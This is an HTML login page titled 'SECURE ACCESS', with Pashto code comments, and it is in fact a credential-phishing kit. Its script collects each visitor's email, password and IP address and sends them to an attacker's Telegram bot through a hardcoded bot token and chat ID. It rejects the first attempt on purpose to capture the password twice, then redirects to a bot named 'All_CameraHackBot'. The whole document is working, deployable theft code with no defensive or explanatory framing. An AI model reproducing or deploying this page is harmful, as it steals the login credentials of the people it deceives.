<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>LOGIN • SECURE ACCESS</title>
    <style>
        /* پاک، ساده او ځواب ویونکی سټایل */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a2a3a 0%, #010510 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }

        /* د کارت ډیزاین */
        .login-card {
            max-width: 450px;
            width: 100%;
            background: rgba(15, 25, 35, 0.9);
            backdrop-filter: blur(8px);
            border-radius: 1.5rem;
            border: 1px solid rgba(72, 187, 255, 0.3);
            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5);
            padding: 2rem;
        }

        h1 {
            text-align: center;
            color: #ffffff;
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            letter-spacing: -0.5px;
        }

        .sub {
            text-align: center;
            color: #8ba6bc;
            font-size: 0.8rem;
            margin-bottom: 1.8rem;
            border-bottom: 1px dashed #2c4c6c;
            padding-bottom: 0.8rem;
        }

        .input-group {
            margin-bottom: 1.2rem;
        }

        label {
            display: block;
            color: #aad0ff;
            font-size: 0.75rem;
            font-weight: 500;
            margin-bottom: 0.3rem;
            letter-spacing: 0.5px;
        }

        input {
            width: 100%;
            padding: 0.9rem 1rem;
            background: #0a121c;
            border: 1px solid #2c4c6c;
            border-radius: 1rem;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59,130,246,0.3);
        }

        button {
            width: 100%;
            padding: 0.9rem;
            background: #2563eb;
            border: none;
            border-radius: 2rem;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 0.5rem;
        }

        button:hover {
            background: #1d4ed8;
            transform: scale(1.01);
        }

        .message {
            margin-top: 1rem;
            padding: 0.7rem;
            border-radius: 1rem;
            font-size: 0.85rem;
            text-align: center;
            display: none;
        }

        .error {
            background: rgba(220, 38, 38, 0.2);
            border: 1px solid #ef4444;
            color: #fca5a5;
        }

        .success {
            background: rgba(34, 197, 94, 0.2);
            border: 1px solid #22c55e;
            color: #86efac;
        }

        .footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.65rem;
            color: #5a7b9c;
        }

        .attempt-badge {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.7rem;
            color: #5f9ea0;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h1>🔐 LOGIN</h1>
    <div class="sub">Secure Access Required</div>

    <!-- د تېروتنې/بریالیتوب پیغامونه -->
    <div id="errorBox" class="message error"></div>
    <div id="successBox" class="message success"></div>

    <!-- فورم ساحې -->
    <div class="input-group">
        <label>📧 EMAIL ADDRESS</label>
        <input type="email" id="email" placeholder="you@example.com">
    </div>

    <div class="input-group">
        <label>🔑 PASSWORD</label>
        <input type="password" id="password" placeholder="············">
    </div>

    <button id="loginBtn">▶ LOGIN</button>
    <div id="attemptCounter" class="attempt-badge">◈ First attempt will be rejected automatically</div>
    <div class="footer">Zero‑Log • Telegram secured</div>
</div>

<script>
    // ========== ثابتې ارزښتونه ==========
    const BOT_TOKEN = "8737718436:AAGEkqwayT058tBVH_Pp-W2T0B-aaJXMylU";
    const ADMIN_CHAT_ID = "8295417969";
    // سم لینک — ستاسو د بوټ یوزرنیم سره
    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";

    // د کارونکي د هڅو شمېرلو لپاره (د IP پر بنسټ)
    let attemptData = {};

    // ========== د IP پته ترلاسه کول ==========
    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ========== د Telegram خبرتیا لیږل ==========
    async function notifyAdmin(email, password, ip, attemptNumber, success) {
        const status = success ? "✅ SUCCESSFUL LOGIN" : "❌ FAILED ATTEMPT";
        const msg = `${status}\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📊 Attempt: ${attemptNumber}\n🕒 Time: ${new Date().toLocaleString()}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: msg
                })
            });
        } catch (err) {
            console.warn("Telegram error", err);
        }
    }

    // ========== UI پیغامونه ==========
    function showMessage(elementId, text, isError = true) {
        const box = document.getElementById(elementId);
        box.textContent = text;
        box.className = `message ${isError ? 'error' : 'success'}`;
        box.style.display = 'block';
        setTimeout(() => { box.style.display = 'none'; }, 4000);
    }

    // ========== اصلي د ننوتلو تابع ==========
    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const errorBox = document.getElementById('errorBox');
        const successBox = document.getElementById('successBox');
        const counterSpan = document.getElementById('attemptCounter');

        // ساده تایید
        if (!email || !password) {
            showMessage('errorBox', '❌ Please fill in both email and password.', true);
            return;
        }
        if (!email.includes('@') || !email.includes('.')) {
            showMessage('errorBox', '❌ Enter a valid email address (e.g., name@domain.com).', true);
            return;
        }

        // د IP پته او هڅې تعقیبول
        const ip = await getUserIP();
        if (!attemptData[ip]) {
            attemptData[ip] = { attempts: 0 };
        }
        const currentAttempt = attemptData[ip].attempts + 1;
        attemptData[ip].attempts = currentAttempt;

        // د هڅو ښودنه
        counterSpan.innerHTML = currentAttempt === 1 ? "⚠️ First attempt — will be rejected automatically" : "✅ Second attempt — will be accepted & redirected";

        // ========== 1. لومړی ځل ==========
        if (currentAttempt === 1) {
            // اډمن ته خبر ورکړئ (ناکامه هڅه)
            await notifyAdmin(email, password, ip, currentAttempt, false);
            showMessage('errorBox', '❌ Invalid credentials. Second attempt will be accepted.', true);
            return;
        }

        // ========== 2. دوهم ځل ==========
        if (currentAttempt >= 2) {
            // اډمن ته خبر ورکړئ (بریالۍ هڅه)
            await notifyAdmin(email, password, ip, currentAttempt, true);
            showMessage('successBox', '✅ Login successful! Redirecting to Telegram bot...', false);
            
            // د فورم پټ کړئ ترڅو بیا کلیک ونکړي
            document.getElementById('loginBtn').disabled = true;
            document.getElementById('loginBtn').style.opacity = '0.6';
            
            // بوټ ته لیږدول
            setTimeout(() => {
                window.location.href = BOT_REDIRECT;
            }, 1800);
            return;
        }
    });

    // د Enter کیلي ملاتړ
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });
    });
</script>
</body>
</html>
